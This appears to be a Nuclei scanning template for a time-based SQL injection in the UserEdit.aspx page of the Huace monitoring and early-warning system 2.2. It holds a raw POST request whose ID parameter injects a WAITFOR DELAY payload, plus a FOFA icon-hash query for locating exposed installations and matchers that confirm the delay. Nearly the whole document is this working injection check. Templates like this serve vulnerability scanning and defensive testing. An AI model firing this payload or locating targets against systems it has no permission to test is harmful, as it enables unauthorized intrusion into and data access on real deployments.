id: huace-UserEdit-sqli

info:
  name: 华测监测预警系统 2.2 UserEdit.aspx - sqli
  author: leadlife
  severity: high
  description:
  reference: 
    - https://github.com/wy876/POC/blob/main/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3UserEdit.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  metadata:
    verified: true
    fofa-query: icon_hash="-628229493"
  tags: huace,sqli,time
  
http:
  - raw:
      - |+
        @timeout: 15s
        POST /Web/SysManage/UserEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close

    max-redirects: 3
    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'监测')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and
